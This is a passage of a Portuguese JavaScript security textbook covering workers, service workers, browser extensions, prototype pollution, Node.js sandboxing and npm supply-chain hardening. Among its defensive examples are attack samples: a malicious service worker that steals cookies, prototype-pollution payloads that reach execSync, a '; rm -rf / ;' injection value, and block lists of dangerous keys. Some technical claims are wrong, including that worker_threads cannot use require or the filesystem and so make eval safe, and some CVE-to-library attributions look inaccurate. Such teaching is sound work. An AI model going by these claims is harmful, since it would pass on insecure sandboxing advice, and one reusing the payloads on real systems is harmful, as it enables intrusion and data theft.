    console.log('Resultado:', result);
};

// Encerrar Worker quando nao precisar mais
worker.terminate();

// worker.js
self.onmessage = (event) => {
    const { type, data } = event.data;

    if (type === 'process') {
        // Processar dados
        const result = processData(data);

        // Enviar resultado de volta
        self.postMessage(result);
    }
};

function processData(data) {
    // Nao pode acessar DOM
    // document.body // ReferenceError: document is not defined
    // window.location // ReferenceError: window is not defined

    return data.map(item => item * 2);
}
```

### 12.6.3 SharedArrayBuffer -- Zona de Risco

SharedArrayBuffer permite compartilhar memoria entre threads, quebrando o isolamento:

```javascript
// main.js
// ATENCAI: SharedArrayBuffer requer headers de seguranca
// Cross-Origin-Opener-Policy: same-origin
// Cross-Origin-Embedder-Policy: require-corp

const sharedBuffer = new SharedArrayBuffer(1024);
const intArray = new Int32Array(sharedBuffer);

// Enviar copia do buffer para o Worker
const worker = new Worker('worker.js');
worker.postMessage({ buffer: sharedBuffer });

// Ler dados que o Worker escreveu
setTimeout(() => {
    console.log('Valor compartilhado:', Atomics.load(intArray, 0));
}, 1000);

// worker.js
self.onmessage = (event) => {
    const { buffer } = event.data;
    const intArray = new Int32Array(buffer);

    // Escrever diretamente na memoria compartilhada
    Atomics.store(intArray, 0, 42);
};

// VULNERAVEL: Spectre pode explorar SharedArrayBuffer
// para medir tempos de acesso a memoria
// Mitigacao: nao usar SharedArrayBuffer sem necessidade real
```

### 12.6.4 Web Workers -- Padrões de Seguranca

```javascript
// 1. Validar mensagens recebidas
self.onmessage = (event) => {
    const { type, payload } = event.data;

    // Whitelist de tipos de mensagem
    const allowedTypes = ['process', 'validate', 'transform'];
    if (!allowedTypes.includes(type)) {
        console.error('Tipo de mensagem nao permitido:', type);
        return;
    }

    // Validar payload
    if (type === 'process' && typeof payload !== 'string') {
        self.postMessage({ error: 'Payload invalido' });
        return;
    }

    // Processar apenas apos validacao
    const result = processMessage(type, payload);
    self.postMessage({ type: 'result', data: result });
};

// 2. Limitar tempo de execucao
const MAX_EXECUTION_TIME = 5000; // 5 segundos

function withTimeout(fn, timeout) {
    return new Promise((resolve, reject) => {
        const timer = setTimeout(() => reject(new Error('Timeout')), timeout);
        fn().then(resolve, reject).finally(() => clearTimeout(timer));
    });
}

// 3. Usar Content Security Policy para Workers
// CSP para o script do Worker:
// Content-Security-Policy: worker-src 'self'

// 4. Nunca confiar em dados recebidos de Workers
// (eles podem ser comprometidos)
worker.onmessage = (event) => {
    const result = event.data;
    // Validar antes de usar
    if (!isValidResult(result)) {
        return;
    }
    // Usar resultado validado
    updateUI(result);
};
```

---

## 12.7 Service Workers -- Consideracoes de Seguranca

### 12.7.1 O Que e um Service Worker

Service Workers sao scripts que rodam em background, independentemente da pagina. Eles interceptam requisicos de rede e podem armazenar, retornar ou modificar respostas:

```
Browser
  |
  +-- Page (main thread)
  |     |
  |     +-- Fetch request
  |           |
  +-- Service Worker (separate thread)
        |
        +-- Cache (optional)
        +-- Network (optional)
```

### 12.7.2 Riscos de Seguranca dos Service Workers

Service Workers representam riscos unicos porque:

1. **Persistencia**: ficam ativos mesmo apos o fechamento da aba
2. **Interceptacao**: podem interceptar todas as requisicoes da origem
3. **Escopo**: controlam todos os URLs dentro do escopo
4. **Ataque Man-in-the-Middle**: podem servir conteudo alterado

```javascript
// RISCO: Service Worker malicioso pode interceptar tudo
// Todo request passa pelo SW

// service-worker.js (MALICIOSO)
self.addEventListener('fetch', (event) => {
    // Interceptar TODAS as requisicoes
    event.respondWith(
        fetch(event.request).then(response => {
            // Injetar script malicioso em todas as paginas HTML
            if (response.headers.get('content-type')?.includes('text/html')) {
                return response.text().then(html => {
                    const maliciousHtml = html + '<script>sendToAttacker(document.cookie)</script>';
                    return new Response(maliciousHtml, {
                        headers: response.headers
                    });
                });
            }
            return response;
        })
    );
});

// service-worker.js (SEGURO)
self.addEventListener('fetch', (event) => {
    // Apenas para GET requests
    if (event.request.method !== 'GET') return;

    // Apenas para requests especificos
    if (!event.request.url.startsWith('https://api.example.com')) return;

    event.respondWith(
        caches.match(event.request).then(cached => {
            if (cached) return cached;

            return fetch(event.request).then(response => {
                // Verificar se a resposta e segura
                if (!response.ok) return response;

                // Apenas cache de responses da API
                if (response.headers.get('content-type')?.includes('application/json')) {
                    const clone = response.clone();
                    caches.open('api-v1').then(cache => {
                        cache.put(event.request, clone);
                    });
                }

                return response;
            });
        })
    );
});
```

### 12.7.3 Registrando Service Workers de Forma Segura

```javascript
// main.js -- registracao segura de Service Worker
if ('serviceWorker' in navigator) {
    window.addEventListener('load', async () => {
        try {
            // Registrar com escopo restrito
            const registration = await navigator.serviceWorker.register(
                '/sw.js',
                { scope: '/app/' } // escopo restrito
            );

            // Verificar se o SW esta ativo
            if (registration.installing) {
                console.log('Service Worker instalando');
            } else if (registration.waiting) {
                console.log('Service Worker aguardando');
                // Ativar imediatamente
                registration.waiting.postMessage({ type: 'SKIP_WAITING' });
            } else if (registration.active) {
                console.log('Service Worker ativo');
            }

            // Atualizar SW quando necessario
            registration.addEventListener('updatefound', () => {
                const newWorker = registration.installing;
                newWorker.addEventListener('statechange', () => {
                    if (newWorker.state === 'activated') {
                        console.log('Service Worker atualizado');
                    }
                });
            });
        } catch (error) {
            console.error('Falha ao registrar Service Worker:', error);
        }
    });
}

// Desregistrar Service Worker (quando necessario)
async function unregisterSW() {
    const registration = await navigator.serviceWorker.getRegistration();
    if (registration) {
        await registration.unregister();
        console.log('Service Worker desregistrado');
    }
}
```

### 12.7.4 Atualizacao Segura de Service Workers

```javascript
// service-worker.js
const CACHE_NAME = 'app-cache-v2'; // incrementar para atualizar

const CACHEABLE_URLS = [
    '/',
    '/static/css/main.css',
    '/static/js/app.js'
];

self.addEventListener('install', (event) => {
    // Pre-cache de recursos estaticos
    event.waitUntil(
        caches.open(CACHE_NAME).then(cache => {
            return cache.addAll(CACHEABLE_URLS);
        })
    );
});

self.addEventListener('activate', (event) => {
    // Limpar caches antigos
    event.waitUntil(
        caches.keys().then(cacheNames => {
            return Promise.all(
                cacheNames
                    .filter(name => name !== CACHE_NAME)
                    .map(name => caches.delete(name))
            );
        })
    );
});

// Verificar integridade dos recursos em cache
self.addEventListener('fetch', (event) => {
    event.respondWith(
        caches.match(event.request).then(cached => {
            if (!cached) return fetch(event.request);

            // Verificar se o cache ainda e valido
            return cached;
        })
    );
});
```

---

## 12.8 Seguranca de Browser Extensions

### 12.8.1 Modelo de Permissoes

Browser extensions operam com um sistema de permissoes que determina o que podem fazer:

**Manifest V3 (Chrome/Edge):**

```json
{
    "manifest_version": 3,
    "name": "My Extension",
    "version": "1.0",
    "permissions": [
        "activeTab",
        "storage",
        "scripting"
    ],
    "host_permissions": [
        "https://api.example.com/*"
    ],
    "content_scripts": [
        {
            "matches": ["https://example.com/*"],
            "js": ["content.js"],
            "css": ["styles.css"]
        }
    ],
    "background": {
        "service_worker": "background.js"
    }
}
```

**Permissoes perigosas:**

| Permissao | Risco | Alternativa |
|-----------|-------|-------------|
| `<all_urls>` | Acessa todos os sites | `host_permissions` especificos |
| `tabs` | Leitura de URLs de todas as abas | `activeTab` |
| `webRequest` | Intercepta todas as requisicoes | `declarativeNetRequest` |
| `debugger` | Controle total sobre abas | Nenhuma (evitar) |
| `cookies` | Leitura de cookies cross-origin | Nenhuma |
| `history` | Historico de navegacao | Nenhuma |

### 12.8.2 Ataques Comuns a Extensions

**Content Script Injection:**

```javascript
// content.js -- executado no contexto da pagina
// VULNERAVEL: manipular DOM da pagina diretamente

// O content script roda no contexto da extensao, nao da pagina
// Mas pode manipular o DOM da pagina

// VULNERAVEL: confiar em dados da pagina
const userData = document.getElementById('user-data').textContent;
chrome.storage.local.set({ userData }); // pode ser manipulado

// SEGURO: sanitizar dados antes de usar
function sanitize(str) {
    const div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;
}

const userData = sanitize(document.getElementById('user-data').textContent);
```

**Ataque via messaging:**

```javascript
// background.js
// VULNERAVEL: confiar em mensagens de qualquer content script
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    // Qualquer content script pode enviar esta mensagem
    if (message.type === 'getData') {
        // NUNCA faca isso:
        // chrome.tabs.executeScript(...);
        // chrome.storage.sync.get(...);
    }
});

// SEGUERO: validar sender
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    // Verificar qual aba/enviou a mensagem
    const tabUrl = sender.tab?.url;
    if (!tabUrl || !tabUrl.startsWith('https://trusted.com')) {
        return; // ignorar mensagens nao confiaveis
    }

    if (message.type === 'getData') {
        // Processar apenas para abas confiaveis
    }
});
```

### 12.8.3 Content Security Policy para Extensions

```json
{
    "content_security_policy": {
        "extension_pages": "script-src 'self'; object-src 'self'",
        "sandbox": "sandbox allow-scripts; script-src 'self'"
    }
}
```

Extensions manifest v3 proibem:
- Inline scripts
- eval() e Function()
- Script loading de origens remotas
- Carregamento de scripts via URLs

### 12.8.4 Validacao de Atualizacoes

```javascript
// Verificar se a extensao nao foi adulterada
chrome.runtime.onInstalled.addListener((details) => {
    if (details.reason === 'install') {
        // Primeira instalacao
        chrome.storage.local.set({
            installedAt: Date.now(),
            version: chrome.runtime.getManifest().version
        });
    } else if (details.reason === 'update') {
        // Atualizacao -- verificar integridade
        const previousVersion = details.previousVersion;
        const currentVersion = chrome.runtime.getManifest().version;

        console.log(`Extensao atualizada: ${previousVersion} -> ${currentVersion}`);

        // Verificar se a atualizacao e legitima
        verifyUpdateIntegrity();
    }
});

async function verifyUpdateIntegrity() {
    // Verificar assinatura da extensao
    // Verificar se o codigo nao foi alterado
    // Verificar se as permissoes nao mudaram
}

---

## 12.9 Ataques de Prototype Pollution

### 12.9.1 O Que e Prototype Pollution

Prototype pollution e uma vulnerabilidade em JavaScript onde um atacante consegue injetar propriedades em Object.prototype, afetando todos os objetos do sistema. Isso pode levar a XSS, RCE, ou negacao de servico.

```javascript
// JavaScript usa prototypal inheritance
// Todo objeto herda de Object.prototype

const obj = {};
console.log(obj.__proto__); // Object.prototype

// Vulnerabilidade: merge recursivo sem validacao
function merge(target, source) {
    for (const key in source) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            target[key] = target[key] || {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// ATAQUE: injetar em __proto__
const maliciousPayload = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge({}, maliciousPayload);

// AGORA: todos os objetos sao admin
const user = {};
console.log(user.isAdmin); // true -- TODOS os objetos afetados
```

### 12.9.2 Vetores de Ataque

**Vetor 1: Merge de JSON inseguro**

```javascript
// Express.js -- body parser
// POST /api/update com body: {"__proto__": {"admin": true}}

app.post('/api/update', (req, res) => {
    // VULNERAVEL: merge direto do body
    Object.assign(config, req.body);
    // config.admin agora e true
    // E tambem: todo objeto literal criado depois herda admin=true

    res.json({ success: true });
});

// Se existir verificacao como:
// if (req.user.isAdmin) { ... }
// E req.user e criado com {} apos o merge, ele herda isAdmin=true
```

**Vetor 2: URL query params**

```javascript
// GET /api/user?__proto__[admin]=true

app.get('/api/user', (req, res) => {
    // VULNERAVEL: merge de query params
    const user = {};
    Object.assign(user, req.query);
    // user.__proto__.admin = true

    res.json({ user });
});
```

**Vetor 3: Deep clone inseguro**

```javascript
// VULNERAVEL: deep clone que preserva __proto__
function deepClone(obj) {
    if (obj === null || typeof obj !== 'object') return obj;
    if (Array.isArray(obj)) return obj.map(item => deepClone(item));

    const clone = {};
    for (const key in obj) {
        clone[key] = deepClone(obj[key]); // inclui __proto__
    }
    return clone;
}

// ATAQUE:
const malicious = JSON.parse('{"constructor": {"prototype": {"admin": true}}}');
const cloned = deepClone(malicious);
// clone.constructor.prototype.admin = true
```

**Vetor 4: Template engines**

```javascript
// VULNERAVEL: template engine que usa merge recursivo
// Exemplo com Handlebars antigo (CVE-2019-19919)

const template = '{{#with "s" as |string|}}' +
    '{{#with "e"}}' +
    '{{#with split as |conslist|}}' +
    '{{pop}}' +
    // ... payload complexo que injeta em prototype
    '{{/with}}' +
    '{{/with}}' +
    '{{/with}}';
```

### 12.9.3 CVEs de Prototype Pollution

**CVE-2020-28477 -- lodash**

```
Lodash < 4.17.20
Tipo: Prototype Pollution
Vetor: merge(), mergeWith(), defaultsDeep(), defaultsDeepWith()
Impacto: Permite injecao de propriedades em Object.prototype

// Payload:
lodash.merge({}, JSON.parse('{"__proto__": {"polluted": true}}'));

// Codigo vulneravel no proprio lodash:
function baseMerge(object, source, srcIndex, customizer, stack) {
    // ... recursao que nao valida chaves perigosas
    baseMergeDeep(object, source, srcIndex, customizer, stack);
}
```

**CVE-2021-23337 -- lodash**

```
Lodash < 4.17.21
Tipo: Template Injection + Prototype Pollution
Vetor: template() com options que permitem injecao

// Payload:
lodash.template('<%= require("child_process").execSync("id") %>');
```

**CVE-2022-21823 -- Node.js**

```
Node.js < 18.3.1, 16.17.1, 14.20.1
Tipo: Prototype Pollution via URLSearchParams

// Um request com query params maliciosos pode poluir prototypes
```

**CVE-2023-45133 -- Babel**

```
Babel < 7.23.0
Tipo: Code Injection via template compilation

// Babel poderia executar arbitrary code durante compilacao
// se o input contivesse payloads especificos
```

### 12.9.4 Como Detectar Prototype Pollution

```javascript
// 1. Teste rapido de deteccao
function detectPrototypePollution() {
    const testObj = {};

    // Se o objeto herda propriedades adicionais, pollution existe
    if ('polluted' in testObj) {
        console.error('PROTOTYPE POLLUTION DETECTED');
        console.error('polluted value:', testObj.polluted);
        return true;
    }

    // Testar propriedades conhecidas de pollution
    const dangerousProps = ['admin', 'isAdmin', 'role', 'level'];
    for (const prop of dangerousProps) {
        if (prop in testObj && testObj[prop] !== undefined) {
            console.error(`Possible pollution: ${prop} = ${testObj[prop]}`);
        }
    }

    return false;
}

// 2. Monitor de mudancas em Object.prototype
const originalPrototype = { ...Object.prototype };
const originalDescriptor = Object.getOwnPropertyDescriptors(Object.prototype);

function watchPrototypeChanges() {
    let changeDetected = false;

    const observer = new MutationObserver((mutations) => {
        changeDetected = true;
        console.error('Object.prototype was modified!');
    });

    // Periodicamente verificar se o prototype mudou
    setInterval(() => {
        const currentDescriptor = Object.getOwnPropertyDescriptors(Object.prototype);
        const originalKeys = Object.keys(originalDescriptor);
        const currentKeys = Object.keys(currentDescriptor);

        if (originalKeys.length !== currentKeys.length) {
            console.error('Prototype size changed!');
            const newKeys = currentKeys.filter(k => !originalKeys.includes(k));
            console.error('New keys:', newKeys);
        }
    }, 1000);
}

// 3. ESLint rule para detectar merge inseguro
// .eslintrc.json:
{
    "plugins": ["security"],
    "rules": {
        "security/detect-object-injection": "error"
    }
}
```

### 12.9.5 Ataques Avancados

**Prototype Pollution to XSS:**

```javascript
// Se a pollution controla propriedades que afetam renderizacao
// o atacante pode injetar XSS

// Exemplo: um template engine usa props do prototype
// para decidir o que renderizar

// 1. Pollute a propriedade relevante
merge({}, JSON.parse('{"__proto__": {"render": "malicious HTML"}}'));

// 2. Quando o template renderizar este objeto
// ele usa a propriedade polluita
const obj = {};
template.render(obj); // renderiza "malicious HTML"
```

**Prototype Pollution to RCE:**

```javascript
// Se a pollution controla uma funcao que e chamada
// pode levar a RCE

// Exemplo: propriedade que e usada como callback
merge({}, JSON.parse('{"__proto__": {"callback": "require(\'child_process\').execSync(\'id\')"}}'));

// Se existir codigo que faz:
// obj.callback()
// O atacante executa codigo arbitrario
```

**Prototype Pollution to DoS:**

```javascript
// Se a pollution define propriedades que causam loops infinitos
// ou consumo excessivo de memoria

merge({}, JSON.parse('{"__proto__": {"toJSON": "function() { while(true) {} }"}}'));

// Qualquer objeto que use JSON.stringify() entra em loop
```

---

## 12.10 Prevencao de Prototype Pollution

### 12.10.1 Validacao de Entrada

```javascript
// 1. Bloquear chaves perigosas
function isSafeKey(key) {
    const dangerousKeys = [
        '__proto__',
        'constructor',
        'prototype',
        '__defineGetter__',
        '__defineSetter__',
        '__lookupGetter__',
        '__lookupSetter__',
        '__noSuchMethod__'
    ];
    return !dangerousKeys.includes(key);
}

// 2. Merge seguro com validacao
function safeMerge(target, source) {
    if (typeof target !== 'object' || target === null) return target;
    if (typeof source !== 'object' || source === null) return target;

    for (const key of Object.keys(source)) {
        if (!isSafeKey(key)) {
            throw new Error(`Unsafe key detected: ${key}`);
        }

        if (typeof source[key] === 'object' && source[key] !== null) {
            target[key] = target[key] || {};
            safeMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// 3. Usar Object.create(null) para objetos sem prototype
const safeObj = Object.create(null);
safeObj.__proto__; // undefined -- nao herda nada

// 4. Usar Map ao inves de Object para dados de usuario
const userSettings = new Map();
userSettings.set('theme', 'dark');
userSettings.set('language', 'pt-BR');
// Map nao tem prototype para poluir
```

### 12.10.2 Bibliotecas de Protecao

```javascript
// 1. Usar lodash >= 4.17.21 (patched)
// npm install lodash@latest

// 2. Usar immer para imutabilidade segura
import produce from 'immer';

const nextState = produce(currentState, (draft) => {
    // immer usa Proxy para proteger contra pollution
    draft.value = 10;
});

// 3. Usar deepmerge com opcao de protecao
import deepmerge from 'deepmerge';

const result = deepmerge(target, source, {
    // deepmerge 4.x protege contra __proto__ por padrao
});

// 4. Biblioteca especifica: lodash contrib safe-merge
// npm install lodash-contrib

// 5. Usar structuredClone (nativo)
// structuredClone nao preserva __proto__
const cloned = structuredClone(maliciousObject);
// cloned.__proto__ e o prototype padrao, nao o polluido
```

### 12.10.3 Hardening em Express.js

```javascript
// middleware para protecao contra prototype pollution
function prototypePollutionGuard(req, res, next) {
    const dangerousPatterns = [
        /__proto__/,
        /constructor/,
        /prototype/,
        /\$\{/,  // template injection
        /require\(/,
        /process\./
    ];

    function checkObject(obj, path = '') {
        if (typeof obj !== 'object' || obj === null) return;

        for (const key of Object.keys(obj)) {
            if (dangerousPatterns.some(p => p.test(key))) {
                console.error(`BLOCKED: ${path}.${key}`);
                delete obj[key]; // remover chave perigosa
                continue;
            }

            if (typeof obj[key] === 'object') {
                checkObject(obj[key], `${path}.${key}`);
            }
        }
    }

    // Verificar body, query, e params
    checkObject(req.body, 'body');
    checkObject(req.query, 'query');
    checkObject(req.params, 'params');

    next();
}

app.use(prototypePollutionGuard);

// Alternativa: sanitizar com helmet ou library especifica
import hpp from 'hpp';
app.use(hpp()); // previne HTTP parameter pollution

// Usar Object.create(null) para config interna
const config = Object.create(null);
config.port = 3000;
config.env = 'production';
// config nao herda de Object.prototype
```

### 12.10.4 Object Freeze e Object.seal

```javascript
// Object.freeze() previne adicao de propriedades
const safeConfig = Object.freeze({
    apiVersion: 'v1',
    timeout: 5000,
    retries: 3
});

// ATAQUE de prototype pollution NAO afeta frozen objects
// Mas o prototype em si ainda pode ser poluido

// Para proteger contra pollution, combine:
function createProtectedObject(initial) {
    const obj = Object.create(null); // sem prototype
    Object.assign(obj, initial);
    return Object.freeze(obj);
}

// Object.seal() previne adicao/remocao de propriedades
// mas permite modificar existentes
const sealedObj = Object.seal({ a: 1, b: 2 });
sealedObj.a = 3; // funciona
sealedObj.c = 4; // TypeError: Cannot add property

// Object.preventExtensions() previne adicao
const extObj = { a: 1 };
Object.preventExtensions(extObj);
extObj.b = 2; // TypeError em modo strict
```

### 12.10.5 Prototype Pollution em Bibliotecas Comuns

| Biblioteca | CVE | Versao Afetada | Fix |
|-----------|-----|----------------|-----|
| lodash | CVE-2020-28477 | < 4.17.20 | Upgrade para 4.17.21+ |
| lodash | CVE-2021-23337 | < 4.17.21 | Upgrade para 4.17.21+ |
| merge | CVE-2020-28499 | < 2.1.1 | Upgrade ou substituir |
| deep-extend | CVE-2018-16492 | < 0.5.1 | Upgrade |
| extend | CVE-2018-16490 | < 3.0.2 | Upgrade |
| hoek | CVE-2018-3728 | < 4.2.1 | Upgrade |
| lodash.set | CVE-2018-3721 | < 4.3.2 | Upgrade |
| minimist | CVE-2021-44906 | < 1.2.6 | Upgrade |

### 12.10.6 Auditoria de Dependencias

```javascript
// package.json -- scripts de auditoria
{
    "scripts": {
        "audit": "npm audit",
        "audit:fix": "npm audit fix",
        "audit:production": "npm audit --omit=dev",
        "check:dependencies": "npx depcheck",
        "check:outdated": "npm outdated",
        "check:licenses": "npx license-checker --failOn \"GPL-3.0\""
    }
}

// Verificar vulnerabilidades conhecidas
// npm audit -- audit do npm
// yarn audit -- audit do yarn
// pnpm audit -- audit do pnpm

// Snyk para auditoria avancada
// npx snyk test
// npx snyk monitor
```

---

## 12.11 Seguranca em Node.js -- Auditoria de Dependencias e Sandboxing

### 12.11.1 O Problema de Supply Chain em Node.js

O ecossistema npm e o maior repositorio de pacotes de codigo aberto, com mais de 2 milhoes de pacotes. Isso cria uma superficie de ataque enorme:

```
Meu Projeto
  |
  +-- dependencia-direta-1
  |     +-- sub-dependencia-a
  |     +-- sub-dependencia-b
  |           +-- sub-sub-dependencia-x
  |
  +-- dependencia-direta-2
  |     +-- sub-dependencia-c
  |
  +-- dependencia-direta-3 (PACOTE COMPROMETIDO)
        +-- sub-dependencia-d (MALICIOSO)
```

### 12.11.2 npm audit -- Primeira Linha de Defesa

```bash
# Auditoria basica
npm audit

# Auditoria incluindo devDependencies
npm audit --include=dev

# Auditoria apenas production
npm audit --omit=dev

# Corrigir automaticamente (atualizacoes seguras)
npm audit fix

# Forcar correcao (pode quebrar compatibilidade)
npm audit fix --force

# Formato JSON para automacao
npm audit --json

# Ignorar vulnerabilidades especificas (ultimo recurso)
# .npmrc:
audit=false
# OU
npm audit --omit=dev  # so auditar dependencias de producao
```

### 12.11.3 Dependabot e Renovate

```yaml
# .github/dependabot.yml
version: 2
updates:
  # Dependencias npm
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
    open-pull-requests-limit: 10
    reviewers:
      - "team-leads"
    labels:
      - "dependencies"
      - "security"
    allow:
      - dependency-type: "production"
    groups:
      lodash:
        patterns: ["lodash*"]
      security-patches:
        update-types: ["patch"]
        patterns: ["*"]

  # GitHub Actions
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

### 12.11.4 Sandboxing com Node.js -- vm Module

```javascript
// vm module -- isolamento basico de script
const vm = require('vm');

// Criar contexto isolado
const isolatedContext = vm.createContext({
    console: { log: console.log },
    Math: Math,
    Date: Date
});

// Executar script no contexto isolado
const maliciousScript = `
    // Nao pode acessar require, process, ou outros modulos nativos
    try {
        const fs = require('fs'); // ReferenceError: require is not defined
        const process = process; // ReferenceError: process is not defined
    } catch(e) {
        console.log('Acesso bloqueado:', e.message);
    }

    // Pode usar apenas o que foi exposto
    console.log(Math.random());
`;

vm.runInContext(maliciousScript, isolatedContext);

// IMPORTANTE: vm nao e um sandbox seguro contra ataques hostis
// Para isolamento real, use containers ou processos separados
```

### 12.11.5 Sandboxing com Containers

```javascript
// Docker para isolar scripts maliciosos
// Dockerfile:
/*
FROM node:20-alpine
RUN addgroup -S sandbox && adduser -S sandbox -G sandbox
COPY --chown=sandbox:sandbox script.js /app/
USER sandbox
WORKDIR /app
*/

// Executar script em container
const { exec } = require('child_process');

function runInSandbox(script, options = {}) {
    const {
        timeout = 5000,
        memoryLimit = '128m',
        networkMode = 'none'
    } = options;

    const command = [
        'docker run',
        '--rm',
        '--network', networkMode,
        '--memory', memoryLimit,
        '--cpus', '0.5',
        `--read-only`,  // filesystem somente leitura
        `--tmpfs /tmp:size=10m`, // tmpfs limitado
        '--security-opt=no-new-privileges',
        `node:20-alpine`,
        'node', '-e', JSON.stringify(script)
    ].join(' ');

    return new Promise((resolve, reject) => {
        exec(command, { timeout }, (error, stdout, stderr) => {
            if (error) {
                reject(new Error(`Sandbox error: ${error.message}\n${stderr}`));
            } else {
                resolve(stdout);
            }
        });
    });
}

// Usar:
runInSandbox('console.log("hello from sandbox")', { timeout: 3000 })
    .then(console.log)
    .catch(console.error);
```

### 12.11.6 child_process Seguro

```javascript
const { spawn, execFile, exec } = require('child_process');

// VULNERAVEL: exec com interpolacao
function unsafeRun(input) {
    exec(`echo ${input}`); // COMMAND INJECTION
    // input = "; rm -rf / ;"
}

// SEGURO: spawn com array de argumentos
function safeRun(userInput) {
    const child = spawn('echo', [userInput]); // argumentos separados
    // Nao ha interpolacao de shell

    child.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
    });

    child.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
    });

    child.on('close', (code) => {
        console.log(`exit code: ${code}`);
    });
}

// SEGURO: execFile (nao usa shell)
function safeExecFile(file, args) {
    return new Promise((resolve, reject) => {
        execFile(file, args, { timeout: 5000 }, (error, stdout, stderr) => {
            if (error) reject(error);
            else resolve(stdout);
        });
    });
}

// SEGURO: validacao de input antes de usar
function validateAndRun(input) {
    // Whitelist de caracteres permitidos
    const SAFE_PATTERN = /^[a-zA-Z0-9\s\-_.]+$/;
    if (!SAFE_PATTERN.test(input)) {
        throw new Error('Invalid input');
    }

    return spawn('echo', [input]);
}

// SEGURO: usar execFileSync (sincrono, sem shell)
const result = execFileSync('ls', ['-la', '/tmp'], {
    timeout: 5000,
    encoding: 'utf8'
});
```

### 12.11.7 Worker Threads para Isolacao

```javascript
// worker_threads -- isolamento melhor que child_process
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');

if (isMainThread) {
    // Codigo principal
    function runInWorker(script) {
        return new Promise((resolve, reject) => {
            const worker = new Worker(__filename, {
                workerData: { script },
                // Sem acesso a filesystem
                // Sem acesso a rede (por padrao)
            });

            worker.on('message', resolve);
            worker.on('error', reject);
            worker.on('exit', (code) => {
                if (code !== 0) reject(new Error(`Worker stopped with code ${code}`));
            });

            // Timeout
            setTimeout(() => {
                worker.terminate();
                reject(new Error('Worker timeout'));
            }, 5000);
        });
    }

    // Usar:
    runInWorker('console.log("hello")')
        .then(console.log)
        .catch(console.error);
} else {
    // Codigo do Worker
    try {
        // Tentar executar script arbitrario
        // Nao tem acesso a require, process, etc.
        eval(workerData.script);
    } catch (e) {
        parentPort.postMessage(`Error: ${e.message}`);
    }
}
```

### 12.11.8 Node.js Permissions API

```javascript
// Node.js 20+ -- permissoes de seguranca (experimental)
// node --experimental-permission --allow-fs-read=/tmp script.js

// package.json
{
    "scripts": {
        "start": "node --experimental-permission --allow-fs-read=/home/app --allow-child-process server.js"
    }
}

// Verificar permissoes no runtime
if (process.permission) {
    console.log('Permissoes:', process.permission);
}

// Com --experimental-permission:
// - Sem --allow-fs-read, nao pode ler filesystem
// - Sem --allow-fs-write, nao pode escrever filesystem
// - Sem --allow-child-process, nao pode criar processos
// - Sem --allow-worker, nao pode criar workers
```

### 12.11.9 Protecao contra Ataques de ReDoS

```javascript
// ReDoS (Regular Expression Denial of Service)
// Padroes regex maliciosos podem causar backtracking exponencial

// VULNERAVEL: regex com backtracking exponencial
const vulnerableRegex = /^(a+)+$/;
// Input: "aaaaaaaaaaaaaaaaaaaaaaaaaaab"
// Causa: 2^n backtracks

// SEGUIRO: usar regex seguro ou validar tamanho
function safeRegexTest(input, regex, maxLength = 1000) {
    if (input.length > maxLength) {
        throw new Error('Input too long for regex');
    }
    return regex.test(input);
}

// Ferramenta: safe-regex
// npm install safe-regex
const safeRegex = require('safe-regex');
if (!safeRegex(vulnerableRegex)) {
    console.error('Regex is vulnerable to ReDoS');
}

// Alternativa: usar regex do Re2 (C++ backend)
// npm install re2
const RE2 = require('re2');
const safeRe2 = new RE2('^(a+)+$', 'g');
safeRe2.test('aaaaaaaaaaaaaaaaaaaaaaaaaaab'); // funciona sem backtracking
```

---

## 12.12 Seguranca npm -- Integridade de Lockfiles e Proveniencia

### 12.12.1 O Que e Lockfile e Por Que Importa

O lockfile (`package-lock.json` ou `yarn.lock`) registra a versao exata de cada dependencia instalada. Sem ele, `npm install` pode instalar versoes diferentes entre ambientes:

```json
// package-lock.json -- formato v3
{
    "name": "my-app",
    "version": "1.0.0",
    "lockfileVersion": 3,
    "packages": {
        "": {
            "name": "my-app",
            "version": "1.0.0",
            "dependencies": {
                "lodash": "^4.17.21"
            }
        },
        "node_modules/lodash": {
            "version": "4.17.21",
            "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
            "integrity": "sha512-v2kDEe57lecTulaDIuNTPy3Ry4gLGJ6Z1O3vE1k0XDiK3Z90Y4n97...=="
        }
    }
}
```

### 12.12.2 Integridade do Lockfile

```bash
# Verificar integridade do lockfile
npm ci --ignore-scripts
# npm ci: instala EXATAMENTE o que esta no lockfile
# Mais rapido que npm install e mais seguro

# Detectar lockfile desatualizado
npm install --dry-run
# Se mudar algo, o lockfile esta desatualizado

# Verificar hash de cada pacote
npm pack --dry-run  # mostra o que seria empacotado
```

### 12.12.3 npm Provenance

```bash
# npm provenance -- assina pacotes com attestacao
# Requer: npm 9.5.0+, token com write permission, CI/CD

# Publicar com provenance
npm publish --provenance --access public

# Verificar provenance de um pacote
npm audit signatures
```

```yaml
# GitHub Actions com provenance
name: Publish Package
on:
  release:
    types: [published]

permissions:
  contents: read
  id-token: write  # necessario para OIDC

jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          registry-url: https://registry.npmjs.org
      - run: npm ci
      - run: npm test
      - run: npm publish --provenance --access public
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
```

### 12.12.4 .npmrc Seguro

```ini
# .npmrc -- configuracao de seguranca
# Desabilitar scripts de pos-instalacao (previne ataque)
ignore-scripts=true

# Usar apenas HTTPS
registry=https://registry.npmjs.org/

# Verificar SSL
strict-ssl=true

# Ca certificado (para ambientes corporativos)
cafile=/path/to/corporate-ca.pem

# Desabilitar package-lock
# NUNCA faca isso em producao
# package-lock=false

# Configuracao por ambiente
# .npmrc (projeto):
engine-strict=true
save-exact=true
```

### 12.12.5 Verificacao de Pacotes

```javascript
